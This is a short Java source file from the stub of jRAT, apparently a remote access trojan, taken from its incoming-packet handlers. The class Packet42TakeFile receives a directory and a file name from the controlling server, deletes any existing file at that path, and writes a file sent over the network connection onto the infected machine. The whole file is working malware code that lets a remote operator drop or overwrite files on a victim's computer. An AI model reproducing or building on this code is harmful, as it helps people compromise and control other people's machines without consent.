package io.jrat.stub.packets.incoming;

import io.jrat.common.io.FileIO;
import io.jrat.stub.Connection;
import io.jrat.stub.Main;

import java.io.File;


public class Packet42TakeFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String destdir = Connection.readLine();
		String filename = Connection.readLine();

		File file = new File(destdir + File.separator + filename);

		if (file.exists() && file.isFile()) {
			file.delete();
		}

		FileIO fileio = new FileIO();
		fileio.readFile(file, Connection.socket, Connection.dis, Connection.dos, null, Main.getKey());
	}

}
